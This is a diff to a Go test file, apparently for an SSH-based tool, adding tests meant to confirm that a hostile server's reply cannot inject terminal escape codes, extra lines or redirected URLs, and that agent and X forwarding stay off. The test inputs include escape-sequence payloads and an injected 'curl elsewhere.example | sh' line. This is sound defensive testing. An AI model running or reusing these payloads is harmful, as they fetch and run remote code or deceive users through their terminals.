@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -12,6 +13,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"slices"
 	"strconv"
 	"strings"
 	"sync"
@@ -460,5 +462,51 @@ func TestTheTerminalsWindowIsRunAgainAndCopiedTextReachesThisComputer(t *testing
 	}
 	if !strings.Contains(got, "link down since") {
 		t.Errorf("the person was not told the link dropped: %q", got)
+	}
+}
+
+// A server that is not what it says. What it answers to `dash url` is put
+// into a link for the browser and printed in the person's terminal: nothing
+// but a code and a path may come through, and no line of its own making.
+func TestAHostileServersAnswerReachesNoTerminalAndNoBrowser(t *testing.T) {
+	dir, c, out := login(t)
+	reply, sock := filepath.Join(dir, "reply"), filepath.Join(dir, "dash.sock")
+	box(t, dir, "#!/bin/sh\ncat "+reply+"\n")
+	var opened safe
+	oldBrowse := browse
+	browse = func(system, link string) error { fmt.Fprintln(&opened, link); return nil }
+	t.Cleanup(func() { browse = oldBrowse })
+	for what, e := range map[string]contract.Envelope{
+		"a code that retitles the terminal": {OK: true, Result: contract.DashURL{Socket: sock, Code: "c0de\x1b]0;owned\a"}},
+		"a code with a line of its own":     {OK: true, Result: contract.DashURL{Socket: sock, Code: "c0de\n> now run: curl elsewhere.example | sh"}},
+		"a code that leaves the address":    {OK: true, Result: contract.DashURL{Socket: sock, Code: "c0de#@elsewhere.example/"}},
+		"a socket that clears the screen":   {OK: true, Result: contract.DashURL{Socket: sock + "\x1b[2J", Code: "c0de"}},
+		"a refusal with lines of its own":   {Error: &contract.Refusal{Message: "no\x1b[2J\n> now run: curl elsewhere.example | sh"}},
+	} {
+		data, _ := json.Marshal(e)
+		if err := os.WriteFile(reply, data, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+		err := page(ctx, c, "box", freePort(t, contract.Loopback))
+		cancel()
+		r := new(contract.Refusal)
+		if !errors.As(err, &r) || r.Code != "no_page" {
+			t.Errorf("%s: connect went on: %v", what, err)
+			continue
+		}
+		if said := r.Message + out.String(); strings.ContainsAny(said, "\x1b\a") || strings.Contains(said, "\n>") || opened.String() != "" {
+			t.Errorf("%s came through: %q, and the browser was opened with %q", what, said, opened.String())
+		}
+	}
+}
+
+// Nothing of this computer is lent to the server: no agent with its keys,
+// and no screen.
+func TestNoAgentAndNoScreenAreHandedOver(t *testing.T) {
+	for _, flag := range []string{"-a", "-x"} {
+		if !slices.Contains(keep, flag) {
+			t.Errorf("a connection is made without %s", flag)
+		}
 	}
 }
